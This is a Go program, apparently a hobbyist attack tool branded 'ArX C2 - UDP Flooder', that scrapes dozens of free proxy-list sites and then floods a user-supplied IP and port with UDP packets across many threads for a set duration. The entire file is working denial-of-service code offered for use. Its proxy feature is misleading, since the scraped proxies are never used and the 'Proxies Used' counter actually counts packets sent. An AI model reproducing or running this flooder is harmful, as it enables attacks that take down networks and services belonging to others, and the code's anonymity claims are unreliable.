package main

import (
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/PuerkitoBio/goquery"
)

var proxyCounter int
var proxyMutex sync.Mutex
var failedProxies int

// Color codes for colorful output
const (
	Red     = "\033[31m"
	Green   = "\033[32m"
	Yellow  = "\033[33m"
	Blue    = "\033[34m"
	Magenta = "\033[35m"
	Cyan    = "\033[36m"
	Reset   = "\033[0m"
)

// Function to print a banner with colors
func printBanner() {
	fmt.Println(Green + "-----------------------------------------------------------------")
	fmt.Println(Magenta + "")
	fmt.Println(Magenta + "        e             Y88b    /        e88~-_   /~~88b         ")
	fmt.Println(Magenta + "       d8b     888-~\\  Y88b  /        d888   \\ |   888         ")
	fmt.Println(Magenta + "      /Y88b    888      Y88b/         8888     `  d88P         ")
	fmt.Println(Magenta + "     /  Y88b   888      /Y88b         8888       d88P          ")
	fmt.Println(Magenta + "   /      Y88b 888    /    Y88b        \"88_-~  d88P___         ")
	fmt.Println(Magenta + "")
	fmt.Println(Magenta + "      ArX C2 - UDP Flooder - By Skibidi lord g & GOAT ROOT      ")
	fmt.Println(Magenta + "")
	fmt.Println(Green + "-----------------------------------------------------------------" + Reset)
}

func scrapeProxies(url string, proxyChan chan<- string) {
	res, err := http.Get(url)
	if err != nil {
		// Increment failed proxies count and return on failure
		failedProxies++
		fmt.Printf(Red+"Failed to fetch proxy list from %s: %v\n"+Reset, url, err)
		return
	}
	defer res.Body.Close()

	doc, err := goquery.NewDocumentFromReader(res.Body)
	if err != nil {
		// Increment failed proxies count and return on failure
		failedProxies++
		fmt.Printf(Red+"Failed to parse proxy list from %s: %v\n"+Reset, url, err)
		return
	}

	doc.Find("table.table tbody tr").Each(func(index int, row *goquery.Selection) {
		ip := row.Find("td").Eq(0).Text()
		port := row.Find("td").Eq(1).Text()
		proxy := fmt.Sprintf("%s:%s", strings.TrimSpace(ip), strings.TrimSpace(port))
		proxyChan <- proxy // Send proxy to channel
	})
}

func udpFlood(wg *sync.WaitGroup, done <-chan struct{}, ip string, port int, packetSize int, proxies []string) {
	defer wg.Done()

	addr := &net.UDPAddr{
		IP:   net.ParseIP(ip),
		Port: port,
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		fmt.Printf(Red+"Failed to connect to %s:%d: %v\n"+Reset, ip, port, err)
		return
	}
	defer conn.Close()

	packet := make([]byte, packetSize)

	for {
		select {
		case <-done:
			return
		default:
			proxyMutex.Lock()
			proxyCounter++
			proxyMutex.Unlock()

			_, err := conn.Write(packet)
			if err != nil {
				fmt.Printf(Red+"Failed to send packet: %v\n"+Reset, err)
				return
			}
		}
	}
}

func main() {
	// Print the banner
	printBanner()

	if len(os.Args) != 6 {
		fmt.Printf("Usage: %s <ip> <port> <num_threads> <duration_seconds> <packet_size>\n", os.Args[0])
		os.Exit(1)
	}

	ip := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil || port <= 0 || port > 65535 {
		fmt.Printf(Red+"Invalid port number: %s\n"+Reset, os.Args[2])
		os.Exit(1)
	}

	threads, err := strconv.Atoi(os.Args[3])
	if err != nil || threads <= 0 {
		fmt.Printf(Red+"Invalid number of threads: %s\n"+Reset, os.Args[3])
		os.Exit(1)
	}

	duration, err := strconv.Atoi(os.Args[4])
	if err != nil || duration <= 0 {
		fmt.Printf(Red+"Invalid duration: %s\n"+Reset, os.Args[4])
		os.Exit(1)
	}

	packetSize, err := strconv.Atoi(os.Args[5])
	if err != nil || packetSize <= 0 {
		fmt.Println(Red+"Invalid packet size:", os.Args[5]+Reset)
		os.Exit(1)
	}

	proxySources := []string{
		"https://www.sslproxies.org/",
		"https://free-proxy-list.net/",
		"https://us-proxy.org/",
		"https://www.free-proxy-list.net/",
        "https://www.sslproxies.org/",
        "https://us-proxy.org/",
        "https://www.proxyscrape.com/free-proxy-list",
        "https://hidemy.name/en/proxy-list/",
        "http://spys.one/en/free-proxy-list/",
        "https://www.freeproxylist.org/",
        "https://www.proxynova.com/proxy-server-list/",
        "https://geonode.com/free-proxies/",
        "https://proxy-list.download/",
        "https://www.proxy4free.com/",
        "https://www.proxybutler.com/",
        "https://hide.me/en/proxy",
        "https://www.zalmos.com/",
        "https://www.my-proxy.com/free-proxy-list/",
        "https://www.hideipvpn.com/free-proxy/",
        "https://www.goproxy.com/",
        "http://www.proxyserver.com/",
        "https://www.atozproxy.com/",
        "https://whoer.net/proxy/",
        "https://proxydb.net/",
        "https://www.proxynova.com/",
        "https://www.proxylistplus.com/",
        "https://proxylisty.com/",
        "https://my-proxy.com/free-proxy-list/",
        "https://www.hydraproxy.com/",
        "https://www.hidemyass.com/en-us/proxy",
        "https://proxycrawl.com/",
        "https://www.proxylists.net/",
        "http://proxy-server.org/",
        "https://proxyx.com/",
        "https://www.freeproxy.world/",
        "https://www.ipaddress.com/",
        "https://www.proxysource.com/",
        "https://www.proxie.org/",
        "https://www.proxyparadise.com/",
        "https://topproxy.com/",
	}

	// Channel for proxies
	proxyChan := make(chan string, 10000)
	var proxies []string

	// Goroutines for concurrent proxy scraping
	var wg sync.WaitGroup
	for _, source := range proxySources {
		wg.Add(1)
		go func(url string) {
			defer wg.Done()
			scrapeProxies(url, proxyChan)
		}(source)
	}

	// Collect proxies
	go func() {
		wg.Wait()
		close(proxyChan)
	}()
	for proxy := range proxyChan {
		proxies = append(proxies, proxy)
	}

	// Shuffle proxies for random selection
	rand.Seed(time.Now().UnixNano())
	rand.Shuffle(len(proxies), func(i, j int) {
		proxies[i], proxies[j] = proxies[j], proxies[i]
	})

	if len(proxies) == 0 {
		fmt.Println(Red+"No proxies available to use!"+Reset)
		os.Exit(1)
	}

	fmt.Printf(Green+"Loaded %d proxies.\n"+Reset, len(proxies))
	fmt.Printf(Red+"Failed to fetch %d proxy sources.\n"+Reset, failedProxies)

	var wgFlood sync.WaitGroup
	done := make(chan struct{})

	// Periodic status update
	go func() {
		for {
			select {
			case <-done:
				return
			default:
				proxyMutex.Lock()
				fmt.Printf(Cyan+"\rProxies Used: %d"+Reset, proxyCounter)
				proxyMutex.Unlock()
				time.Sleep(1 * time.Second)
			}
		}
	}()

	for i := 0; i < threads; i++ {
		wgFlood.Add(1)
		go udpFlood(&wgFlood, done, ip, port, packetSize, proxies)
	}

	time.AfterFunc(time.Duration(duration)*time.Second, func() {
		close(done)
	})

	wgFlood.Wait()
	fmt.Println(Red + "\nFlood completed - ArX C2" + Reset)
}